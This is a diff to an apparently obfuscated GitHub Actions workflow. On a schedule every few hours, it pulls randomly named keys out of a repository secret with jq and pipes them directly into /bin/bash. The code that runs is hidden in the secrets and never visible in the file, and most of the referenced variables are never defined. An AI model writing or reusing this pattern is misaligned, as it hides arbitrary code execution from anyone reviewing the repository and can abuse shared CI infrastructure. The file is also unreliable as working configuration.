@@ -3,24 +3,21 @@ name: zhouyiri2245
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 4/6 * * *'
+    - cron: '52 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhouyiri2245
         env:
-          ri9: ${{ secrets.ri9 }}
+          jcl482: ${{ secrets.jcl482 }}
         run: |
-          echo $ri9 | jq -r .izowp4285 | /bin/bash
-          echo $a10299 | jq -r .aw8 | /bin/bash
-          echo $glml942 | jq -r .kzcq1 | /bin/bash
-          echo $pcu76 | jq -r .oi0 | /bin/bash
-          echo $if5 | jq -r .qqqln886 | /bin/bash
-          echo $pw75 | jq -r .u586 | /bin/bash
-          echo $d61552 | jq -r .fenk01375 | /bin/bash
-          echo $uqrw50 | jq -r .nl2 | /bin/bash
-          echo $wfut5 | jq -r .qgj1491 | /bin/bash
-          echo $jyp258 | jq -r .h6718 | /bin/bash
+          echo $jcl482 | jq -r .dqzcz29 | /bin/bash
+          echo $x206 | jq -r .leh83 | /bin/bash
+          echo $no24766 | jq -r .wz7841 | /bin/bash
+          echo $z0 | jq -r .wejc8 | /bin/bash
+          echo $fzy98460 | jq -r .kcwv6614 | /bin/bash
 
